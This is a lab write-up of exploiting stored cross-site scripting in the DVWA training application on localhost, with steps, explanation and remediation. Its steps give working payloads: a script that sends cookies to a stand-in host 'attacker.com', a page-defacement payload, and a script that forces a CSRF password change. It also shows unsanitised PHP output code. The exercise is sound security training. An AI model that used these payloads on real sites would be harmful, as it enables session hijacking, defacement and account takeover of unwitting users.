# DVWA Lab — Stored Cross-Site Scripting (XSS)

## Objective
Exploit Stored XSS vulnerability in DVWA to persistently inject
malicious JavaScript that affects all users viewing the page.

## Environment
- Target: DVWA running on localhost
- URL: http://localhost/DVWA
- Login: admin / password
- Security Level: Low

## Steps

### 1. Access Stored XSS Module
- Login to DVWA
- Navigate to: Vulnerabilities → XSS (Stored)

### 2. Inject Malicious JavaScript
**Name Field:** `<script>alert('Stored XSS')</script>`
**Message Field:** `This is a test message`
Click: Sign Guestbook

Result: Alert box appears — payload stored in database ✅

### 3. Verify Persistence
Refresh the page or logout and login again.
Result: Alert box appears again — XSS is PERSISTENT

### 4. Session Stealer
**Name Field:** `<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>`
Result: Every user's cookies sent to attacker's server

### 5. Deface Guestbook
**Name Field:** `admin<img src=x onerror="document.body.innerHTML='<h1>Site Hacked</h1>'">`
Result: All users see "Site Hacked" message

### 6. Force User Actions
**Message Field:** `<script>fetch('/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change')</script>`
Result: Silent CSRF attack — changes user passwords

## Vulnerability Explanation
User input is stored in database and displayed to all users
without encoding or sanitization.

Vulnerable code:
```php
$_SESSION["message"] = $_POST["message"];
echo "Message: " . $_SESSION["message"];
```

Payload stored and executed for every user who views it.

## Why Stored XSS is Dangerous
- **Persistent** — affects all users, not just one
- **No user interaction needed** — auto-executes
- **Harder to detect** — stored in database
- **Wide impact** — thousands of users affected

## Attack Scenarios
- Comment sections in forums
- User profiles / bio sections
- Blog post comments
- Message boards
- Product reviews

## Remediation
- HTML encode all output
- Input validation on server-side
- Content Security Policy (CSP)
- Use parameterized templates
- Regular security audits
- WAF rules for XSS patterns

## Tools Used
- DVWA
- Web Browser DevTools
- Database inspection

## Status
✅ Successfully exploited Stored XSS - Persistent code execution achieved
